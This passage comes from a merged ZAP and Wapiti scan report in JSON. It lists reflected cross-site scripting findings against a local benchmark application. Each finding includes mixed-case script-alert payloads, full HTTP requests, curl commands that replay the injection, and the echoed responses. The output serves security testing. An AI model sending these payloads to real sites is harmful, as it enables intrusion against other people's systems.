              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00728"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00728', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00728.html?BenchmarkTest00728=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwNzI4PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00728', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00728.html?BenchmarkTest00728=SafeText', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00728=%3CScRiPt%3Ealert%28%27wjo0t11de5%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:24:05 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wjo0t11de5')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-01/BenchmarkTest00737",
                    "Wapiti - https://localhost:8444/benchmark/xss-01/BenchmarkTest00737?BenchmarkTest00737=SafeText&BenchmarkTest00737=Movies&BenchmarkTest00737=Writing&BenchmarkTest00737=%3CScRiPt%3Ealert%28%27w5c840x5nx%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w5c840x5nx')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w5c840x5nx')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00737\" -e \"https://localhost:8444/benchmark/xss-01/BenchmarkTest00737.html?BenchmarkTest00737=SafeText\" -d \"BenchmarkTest00737=SafeText&BenchmarkTest00737=Movies&BenchmarkTest00737=Writing&BenchmarkTest00737=%3CScRiPt%3Ealert%28%27w5c840x5nx%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest00737"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00737', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00737.html?BenchmarkTest00737=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAwNzM3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00737', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-01/BenchmarkTest00737.html?BenchmarkTest00737=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest00737=SafeText&BenchmarkTest00737=Movies&BenchmarkTest00737=Writing&BenchmarkTest00737=%3CScRiPt%3Ealert%28%27w5c840x5nx%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:54 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:24:12 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('w5c840x5nx')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01254",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01254?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01254=%3CScRiPt%3Ealert%28%27wa8v491hsf%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wa8v491hsf')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wa8v491hsf')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01254\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01254.html?BenchmarkTest01254=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01254=%3CScRiPt%3Ealert%28%27wa8v491hsf%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01254"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01254', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01254.html?BenchmarkTest01254=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDEyNTQ9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01254', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01254.html?BenchmarkTest01254=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01254=%3CScRiPt%3Ealert%28%27wa8v491hsf%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:56 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:24:24 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wa8v491hsf')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01257",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01257?BenchmarkTest01257=%3CScRiPt%3Ealert%28%27wcmap3hl4o%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wcmap3hl4o')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wcmap3hl4o')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01257\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01257.html\" -d \"BenchmarkTest01257=%3CScRiPt%3Ealert%28%27wcmap3hl4o%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01257"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01257', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01257.html?BenchmarkTest01257=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxMjU3PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01257', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01257.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01257=%3CScRiPt%3Ealert%28%27wcmap3hl4o%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:56 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:24:26 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wcmap3hl4o')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01259",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01259?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01259=%3CScRiPt%3Ealert%28%27wuq7n1s96x%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wuq7n1s96x')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wuq7n1s96x')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01259\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01259.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01259=%3CScRiPt%3Ealert%28%27wuq7n1s96x%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01259"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01259', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01259.html?BenchmarkTest01259=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDEyNTk9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01259', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01259.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01259=%3CScRiPt%3Ealert%28%27wuq7n1s96x%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '49', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: <scrIpt>alert(1);</scRipt> and b.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '59', 'date': 'Sun, 31 Aug 2025 04:24:26 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: <ScRiPt>alert('wuq7n1s96x')</sCrIpT> and b.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
